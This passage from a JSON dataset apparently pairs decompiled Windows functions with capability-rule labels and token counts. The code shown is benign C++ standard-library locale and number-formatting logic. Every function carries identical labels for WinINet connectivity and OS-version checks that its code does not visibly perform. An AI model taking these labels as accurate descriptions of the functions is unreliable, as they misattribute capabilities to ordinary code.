        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0042ec0d(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *puVar6;\n    uint var_40h;\n    uint var_14h;\n    uint var_4h;\n    int32_t iVar4;\n    \n    fcn.0043ad3e(0x34);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    puVar2 = fcn.004257ac(unaff_EBP + -0x40);\n    puVar6 = extraout_ECX + 0x2c;\n    for (iVar5 = 0xb; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    iVar5 = fcn.0045b6c6();\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 0x14) = 0;\n    *(extraout_ECX + 0x18) = 0;\n    uVar3 = *(iVar5 + 0x1c);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.0042170c(uVar3);\n    *(extraout_ECX + 8) = uVar3;\n    fcn.0042ea84(0, iVar5);\n    if (*(extraout_ECX + 0x28) == '\\0') {\n        cVar1 = *(iVar5 + 0x29);\n    }\n    else {\n        cVar1 = *(iVar5 + 0x28);\n    }\n    iVar4 = cVar1;\n    *(extraout_ECX + 0x1c) = iVar4;\n    if ((iVar4 < 0) || (0x7e < iVar4)) {\n        *(extraout_ECX + 0x1c) = 0;\n    }\n    fcn.0043000c(extraout_ECX + 0x20, *(iVar5 + 0x2b), *(iVar5 + 0x2a), *(iVar5 + 0x2e));\n    fcn.0043000c(extraout_ECX + 0x24, *(iVar5 + 0x2d), *(iVar5 + 0x2c), *(iVar5 + 0x2f));\n    if (*(unaff_EBP + 0xc) != '\\0') {\n        *(extraout_ECX + 0x20) = 0x76782b24;\n        *(extraout_ECX + 0x24) = 0x76782b24;\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 705
    },
    "0042ef9f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.0042ef9f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint arg_ch_00;\n    uint arg_14h_00;\n    uint uVar4;\n    int32_t *piVar5;\n    char *pcVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    uint noname_0;\n    int32_t unaff_EBP;\n    int32_t arg_1ch_00;\n    uint32_t arg_1ch_01;\n    uint var_5ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x50);\n    uVar8 = *(unaff_EBP + 0x24);\n    iVar10 = *(unaff_EBP + 0x18);\n    pcVar6 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x54) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x50) = iVar10;\n    if ((uVar8 == 0) || ((*pcVar6 != '+' && (*pcVar6 != '-')))) {\n        arg_1ch_01 = 0;\n    }\n    else {\n        arg_1ch_01 = 1;\n    }\n    if (((((*(iVar10 + 0x14) & 0xe00) == 0x800) && (arg_1ch_01 + 2 <= uVar8)) && (pcVar6[arg_1ch_01] == '0')) &&\n       ((pcVar6[arg_1ch_01 + 1] == 'x' || (pcVar6[arg_1ch_01 + 1] == 'X')))) {\n        arg_1ch_01 = arg_1ch_01 + 2;\n    }\n    fcn.00421bb3(*(iVar10 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    uVar4 = fcn.00428405(unaff_EBP + -0x4c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x44) = uVar4;\n    fcn.00401990();\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x14) = 7;\n    *(unaff_EBP + -0x28) = 0;\n    fcn.00430e5e(uVar8, 0);\n    iVar10 = unaff_EBP + -0x28;\n    *(unaff_EBP + -4) = 1;\n    if (7 < *(unaff_EBP + -0x14)) {\n        iVar10 = *(unaff_EBP + -0x28);\n    }\n    pcVar2 = *(**(unaff_EBP + -0x44) + 0x2c);\n    (**0x4742a4)(pcVar6, pcVar6 + uVar8, iVar10);\n    (*pcVar2)();\n    fcn.00421bb3(*(*(unaff_EBP + -0x50) + 0x30));\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.00428e65(unaff_EBP + -0x4c);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x44) = piVar5;\n    fcn.00401990();\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x40);\n    (*pcVar2)();\n    pcVar6 = unaff_EBP + -0x40;\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x48) = pcVar6;\n    if (0xf < *(unaff_EBP + -0x2c)) {\n        pcVar6 = *(unaff_EBP + -0x40);\n        *(unaff_EBP + -0x48) = pcVar6;\n    }\n    if ((*pcVar6 != '\\x7f') && ('\\0' < *pcVar6)) {\n        pcVar2 = *(**(unaff_EBP + -0x44) + 0x10);\n        (**0x4742a4)();\n        uVar7 = (*pcVar2)();\n        pcVar6 = *(unaff_EBP + -0x48);\n        uVar7 = uVar7 & 0xffff;\n        *(unaff_EBP + -0x44) = uVar7;\n        while (((cVar1 = *pcVar6,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < uVar8 - arg_1ch_01))) {\n            uVar8 = uVar8 - cVar1;\n            fcn.004352e7(uVar8, 1, uVar7);\n            if ('\\0' < pcVar6[1]) {\n                pcVar6 = pcVar6 + 1;\n            }\n            uVar7 = *(unaff_EBP + -0x44);\n        }\n    }\n    iVar10 = *(unaff_EBP + -0x50);\n    uVar8 = *(unaff_EBP + -0x18);\n    *(unaff_EBP + -0x44) = uVar8;\n    uVar7 = *(iVar10 + 0x20);\n    if (((*(iVar10 + 0x24) < 0) || ((*(iVar10 + 0x24) < 1 && (uVar7 == 0)))) || (uVar7 <= uVar8)) {\n        arg_1ch_00 = 0;\n    }\n    else {\n        arg_1ch_00 = uVar7 - uVar8;\n    }\n    uVar8 = *(iVar10 + 0x14) & 0x1c0;\n    if (uVar8 == 0x40) {\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        noname_0 = *(unaff_EBP + 8);\n        var_2ch = *(unaff_EBP + 0x14);\n        uVar4 = *(unaff_EBP + 0x10);\n    }\n    else {\n        if (uVar8 == 0x100) {\n            iVar10 = unaff_EBP + -0x28;\n            if (7 < *(unaff_EBP + -0x14)) {\n                iVar10 = *(unaff_EBP + -0x28);\n            }\n            noname_0 = *(unaff_EBP + 8);\n            puVar9 = fcn.004300bd(noname_0, unaff_EBP + -0x4c, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), iVar10, \n                                  arg_1ch_01);\n            puVar9 = fcn.00430c60(noname_0, unaff_EBP + -0x4c, *puVar9, puVar9[1], *(unaff_EBP + 0x1c), arg_1ch_00);\n            arg_1ch_00 = 0;\n            goto code_r0x0042f1ea;\n        }\n        noname_0 = *(unaff_EBP + 8);\n        puVar9 = fcn.00430c60(noname_0, unaff_EBP + -0x4c, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), *(unaff_EBP + 0x1c)\n                              , arg_1ch_00);\n        arg_1ch_00 = 0;\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        var_2ch = puVar9[1];\n        uVar4 = *puVar9;\n    }\n    puVar9 = fcn.004300bd(noname_0, unaff_EBP + -0x4c, uVar4, var_2ch, var_28h, arg_1ch_01);\ncode_r0x0042f1ea:\n    uVar4 = *puVar9;\n    *(unaff_EBP + 0x10) = uVar4;\n    uVar3 = puVar9[1];\n    *(unaff_EBP + 0x14) = uVar3;\n    *(unaff_EBP + -0x48) = unaff_EBP + -0x28;\n    if (7 < *(unaff_EBP + -0x14)) {\n        *(unaff_EBP + -0x48) = *(unaff_EBP + -0x28);\n    }\n    puVar9 = fcn.004300bd(noname_0, unaff_EBP + -0x5c, uVar4, uVar3, *(unaff_EBP + -0x48) + arg_1ch_01 * 2, \n                          *(unaff_EBP + -0x44) - arg_1ch_01);\n    iVar10 = *(unaff_EBP + -0x50);\n    uVar4 = *(unaff_EBP + 0x1c);\n    uVar3 = *puVar9;\n    arg_ch_00 = *(unaff_EBP + -0x54);\n    *(unaff_EBP + 0x10) = uVar3;\n    arg_14h_00 = puVar9[1];\n    *(iVar10 + 0x20) = 0;\n    *(iVar10 + 0x24) = 0;\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    fcn.00430c60(noname_0, arg_ch_00, uVar3, arg_14h_00, uVar4, arg_1ch_00);\n    fcn.00406810();\n    fcn.00430cd4();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 2604
    },
    "0042f261": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.0042f261(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint arg_ch_00;\n    uint arg_14h_00;\n    uint uVar4;\n    int32_t *piVar5;\n    char *pcVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    uint noname_0;\n    int32_t unaff_EBP;\n    int32_t arg_1ch_00;\n    uint32_t arg_1ch_01;\n    uint var_5ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x50);\n    uVar8 = *(unaff_EBP + 0x24);\n    iVar10 = *(unaff_EBP + 0x18);\n    pcVar6 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x54) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x50) = iVar10;\n    if ((uVar8 == 0) || ((*pcVar6 != '+' && (*pcVar6 != '-')))) {\n        arg_1ch_01 = 0;\n    }\n    else {\n        arg_1ch_01 = 1;\n    }\n    if (((((*(iVar10 + 0x14) & 0xe00) == 0x800) && (arg_1ch_01 + 2 <= uVar8)) && (pcVar6[arg_1ch_01] == '0')) &&\n       ((pcVar6[arg_1ch_01 + 1] == 'x' || (pcVar6[arg_1ch_01 + 1] == 'X')))) {\n        arg_1ch_01 = arg_1ch_01 + 2;\n    }\n    fcn.00421bb3(*(iVar10 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    uVar4 = fcn.004284ab(unaff_EBP + -0x4c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x44) = uVar4;\n    fcn.00401990();\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x14) = 7;\n    *(unaff_EBP + -0x28) = 0;\n    fcn.0040b6c0(uVar8, 0);\n    iVar10 = unaff_EBP + -0x28;\n    *(unaff_EBP + -4) = 1;\n    if (7 < *(unaff_EBP + -0x14)) {\n        iVar10 = *(unaff_EBP + -0x28);\n    }\n    pcVar2 = *(**(unaff_EBP + -0x44) + 0x2c);\n    (**0x4742a4)(pcVar6, pcVar6 + uVar8, iVar10);\n    (*pcVar2)();\n    fcn.00421bb3(*(*(unaff_EBP + -0x50) + 0x30));\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.00428f0b(unaff_EBP + -0x4c);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x44) = piVar5;\n    fcn.00401990();\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x40);\n    (*pcVar2)();\n    pcVar6 = unaff_EBP + -0x40;\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x48) = pcVar6;\n    if (0xf < *(unaff_EBP + -0x2c)) {\n        pcVar6 = *(unaff_EBP + -0x40);\n        *(unaff_EBP + -0x48) = pcVar6;\n    }\n    if ((*pcVar6 != '\\x7f') && ('\\0' < *pcVar6)) {\n        pcVar2 = *(**(unaff_EBP + -0x44) + 0x10);\n        (**0x4742a4)();\n        uVar7 = (*pcVar2)();\n        pcVar6 = *(unaff_EBP + -0x48);\n        uVar7 = uVar7 & 0xffff;\n        *(unaff_EBP + -0x44) = uVar7;\n        while (((cVar1 = *pcVar6,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < uVar8 - arg_1ch_01))) {\n            uVar8 = uVar8 - cVar1;\n            fcn.00435361(uVar8, 1, uVar7);\n            if ('\\0' < pcVar6[1]) {\n                pcVar6 = pcVar6 + 1;\n            }\n            uVar7 = *(unaff_EBP + -0x44);\n        }\n    }\n    iVar10 = *(unaff_EBP + -0x50);\n    uVar8 = *(unaff_EBP + -0x18);\n    *(unaff_EBP + -0x44) = uVar8;\n    uVar7 = *(iVar10 + 0x20);\n    if (((*(iVar10 + 0x24) < 0) || ((*(iVar10 + 0x24) < 1 && (uVar7 == 0)))) || (uVar7 <= uVar8)) {\n        arg_1ch_00 = 0;\n    }\n    else {\n        arg_1ch_00 = uVar7 - uVar8;\n    }\n    uVar8 = *(iVar10 + 0x14) & 0x1c0;\n    if (uVar8 == 0x40) {\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        noname_0 = *(unaff_EBP + 8);\n        var_2ch = *(unaff_EBP + 0x14);\n        uVar4 = *(unaff_EBP + 0x10);\n    }\n    else {\n        if (uVar8 == 0x100) {\n            iVar10 = unaff_EBP + -0x28;\n            if (7 < *(unaff_EBP + -0x14)) {\n                iVar10 = *(unaff_EBP + -0x28);\n            }\n            noname_0 = *(unaff_EBP + 8);\n            puVar9 = fcn.004300bd(noname_0, unaff_EBP + -0x4c, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), iVar10, \n                                  arg_1ch_01);\n            puVar9 = fcn.00430c60(noname_0, unaff_EBP + -0x4c, *puVar9, puVar9[1], *(unaff_EBP + 0x1c), arg_1ch_00);\n            arg_1ch_00 = 0;\n            goto code_r0x0042f4ac;\n        }\n        noname_0 = *(unaff_EBP + 8);\n        puVar9 = fcn.00430c60(noname_0, unaff_EBP + -0x4c, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), *(unaff_EBP + 0x1c)\n                              , arg_1ch_00);\n        arg_1ch_00 = 0;\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        var_2ch = puVar9[1];\n        uVar4 = *puVar9;\n    }\n    puVar9 = fcn.004300bd(noname_0, unaff_EBP + -0x4c, uVar4, var_2ch, var_28h, arg_1ch_01);\ncode_r0x0042f4ac:\n    uVar4 = *puVar9;\n    *(unaff_EBP + 0x10) = uVar4;\n    uVar3 = puVar9[1];\n    *(unaff_EBP + 0x14) = uVar3;\n    *(unaff_EBP + -0x48) = unaff_EBP + -0x28;\n    if (7 < *(unaff_EBP + -0x14)) {\n        *(unaff_EBP + -0x48) = *(unaff_EBP + -0x28);\n    }\n    puVar9 = fcn.004300bd(noname_0, unaff_EBP + -0x5c, uVar4, uVar3, *(unaff_EBP + -0x48) + arg_1ch_01 * 2, \n                          *(unaff_EBP + -0x44) - arg_1ch_01);\n    iVar10 = *(unaff_EBP + -0x50);\n    uVar4 = *(unaff_EBP + 0x1c);\n    uVar3 = *puVar9;\n    arg_ch_00 = *(unaff_EBP + -0x54);\n    *(unaff_EBP + 0x10) = uVar3;\n    arg_14h_00 = puVar9[1];\n    *(iVar10 + 0x20) = 0;\n    *(iVar10 + 0x24) = 0;\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    fcn.00430c60(noname_0, arg_ch_00, uVar3, arg_14h_00, uVar4, arg_1ch_00);\n    fcn.00406810();\n    fcn.00406350();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 2603
    },
    "0042f523": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0042f523(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_8h_00;\n    uint8_t uVar1;\n    uint32_t uVar2;\n    code **ppcVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    code **ppcVar7;\n    code **arg_ch_00;\n    int32_t unaff_EBP;\n    ulong uVar8;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar9;\n    \n    uVar9 = 8;\n    fcn.0043acd3();\n    arg_8h_00 = *(unaff_EBP + 0x10);\n    uVar2 = *(unaff_EBP + 0xc) & 2;\n    *(unaff_EBP + -0x10) = uVar2;\n    arg_ch_00 = NULL;\n    if (uVar2 != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            ppcVar3 = fcn.0043a4f7(0x44, uVar9);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                uVar4 = *(unaff_EBP + 8);\n                ppcVar3[1] = NULL;\n                *ppcVar3 = vtable.std::ctype_unsigned_short_int_.0;\n                fcn.0042ece3(uVar4);\n                ppcVar7 = ppcVar3;\n            }\n            uVar4 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar7, uVar4);\n        }\n        else {\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00428405(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n        }\n    }\n    if ((*(unaff_EBP + 0xc) & 8) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            ppcVar3 = fcn.0043a4f7(8, uVar9);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                *ppcVar3 = \n                vtable.std::num_get_unsigned_short_int__class_std::istreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n                ;\n                ppcVar7 = ppcVar3;\n            }\n            uVar5 = fcn.00401800();\n            uVar4 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar7, uVar5);\n            ppcVar3 = fcn.0043a4f7(8, uVar4);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                *ppcVar3 = \n                vtable.std::num_put_unsigned_short_int__class_std::ostreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n                ;\n                ppcVar7 = ppcVar3;\n            }\n            uVar5 = fcn.00401800();\n            uVar4 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar7, uVar5);\n            ppcVar3 = fcn.0043a4f7(0x18, uVar4);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            *(unaff_EBP + -4) = 7;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                uVar4 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 8;\n                *ppcVar3 = vtable.std::numpunct_unsigned_short_int_.0;\n                fcn.0042ed1e(uVar4, 0);\n                ppcVar7 = ppcVar3;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            uVar4 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar7, uVar4);\n        }\n        else {\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00428bcd(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00428d19(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00428e65(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n        }\n    }\n    uVar1 = fcn.0042a0dc(0, 0);\n    if ((*(unaff_EBP + 0xc) & (1 << (uVar1 & 0x1f)) >> 1) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            ppcVar3 = fcn.0043a4f7(0x10, uVar9);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                *ppcVar3 = vtable.std::collate_unsigned_short_int_.0;\n                uVar8 = fcn.00439a13();\n                ppcVar3[2] = uVar8;\n                ppcVar3[3] = uVar8 >> 0x20;\n                ppcVar7 = ppcVar3;\n            }\n            uVar4 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar7, uVar4);\n        }\n        else {\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.004282b9(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n        }\n    }\n    uVar2 = *(unaff_EBP + 0xc);\n    if ((uVar2 & 0x20) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            ppcVar3 = fcn.0043a4f7(8, uVar9);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                *ppcVar3 = vtable.std::messages_unsigned_short_int_.0;\n                ppcVar7 = ppcVar3;\n            }\n            uVar4 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar7, uVar4);\n        }\n        else {\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00428551(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n        }\n        uVar2 = *(unaff_EBP + 0xc);\n    }\n    if ((uVar2 & 4) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            ppcVar3 = fcn.0043a4f7(8, uVar9);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                *ppcVar3 = \n                vtable.std::money_get_unsigned_short_int__class_std::istreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n                ;\n                ppcVar7 = ppcVar3;\n            }\n            uVar5 = fcn.00401800();\n            uVar4 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar7, uVar5);\n            ppcVar3 = fcn.0043a4f7(8, uVar4);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                *ppcVar3 = \n                vtable.std::money_put_unsigned_short_int__class_std::ostreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n                ;\n                ppcVar7 = ppcVar3;\n            }\n            uVar5 = fcn.00401800();\n            uVar4 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar7, uVar5);\n            ppcVar3 = fcn.0043a4f7(0x58, uVar4);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            *(unaff_EBP + -4) = 0x10;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                uVar4 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 0x11;\n                *ppcVar3 = vtable.std::_Mpunct_unsigned_short_int_.0;\n                *(ppcVar3 + 10) = 0;\n                fcn.0042eb37(uVar4, 0);\n                *ppcVar3 = vtable.std::moneypunct_unsigned_short_int__0_.0;\n                ppcVar7 = ppcVar3;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            uVar5 = fcn.00401800();\n            uVar4 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar7, uVar5);\n            ppcVar3 = fcn.0043a4f7(0x58, uVar4);\n            *(unaff_EBP + -0x14) = ppcVar3;\n            *(unaff_EBP + -4) = 0x16;\n            ppcVar7 = arg_ch_00;\n            if (ppcVar3 != NULL) {\n                ppcVar3[1] = NULL;\n                uVar9 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 0x17;\n                *ppcVar3 = vtable.std::_Mpunct_unsigned_short_int_.0;\n                *(ppcVar3 + 10) = 1;\n                fcn.0042eb37(uVar9, 0);\n                *ppcVar3 = vtable.std::moneypunct_unsigned_short_int__1_.0;\n                ppcVar7 = ppcVar3;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            uVar4 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar7, uVar4);\n        }\n        else {\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.0042869d(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.004287e9(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.004289db(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00428935(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n        }\n        uVar2 = *(unaff_EBP + 0xc);\n    }\n    if ((uVar2 & 0x10) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            iVar6 = fcn.0043a4f7(0x44, uVar9);\n            *(unaff_EBP + -0x14) = iVar6;\n            *(unaff_EBP + -4) = 0x1b;\n            ppcVar7 = arg_ch_00;\n            if (iVar6 != 0) {\n                ppcVar7 = fcn.00429330(*(unaff_EBP + 8), 0);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            uVar5 = fcn.00401800();\n            uVar4 = arg_8h_00;\n            fcn.00423876(arg_8h_00, ppcVar7, uVar5);\n            iVar6 = fcn.0043a4f7(0xc, uVar4);\n            *(unaff_EBP + -0x14) = iVar6;\n            ppcVar7 = arg_ch_00;\n            if (iVar6 != 0) {\n                uVar9 = *(unaff_EBP + 8);\n                ppcVar7 = fcn.00429396(uVar9, 0);\n            }\n            uVar4 = fcn.00401800();\n            fcn.00423876(arg_8h_00, ppcVar7, uVar4);\n        }\n        else {\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.00428fb1(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n            uVar4 = fcn.00401800();\n            uVar5 = fcn.004290fd(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar5, uVar4);\n        }\n    }\n    if (*(unaff_EBP + -0x10) != 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            iVar6 = fcn.0043a4f7(0x34, uVar9);\n            *(unaff_EBP + -0x14) = iVar6;\n            if (iVar6 != 0) {\n                arg_ch_00 = fcn.004292be(*(unaff_EBP + 8), 0);\n            }\n            uVar9 = fcn.00401800();\n            fcn.00423876(arg_8h_00, arg_ch_00, uVar9);\n        }\n        else {\n            uVar9 = fcn.00401800();\n            uVar4 = fcn.0042816d(*(unaff_EBP + 0x14));\n            fcn.00423876(arg_8h_00, uVar4, uVar9);\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 3731
    },
    "0042fa73": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
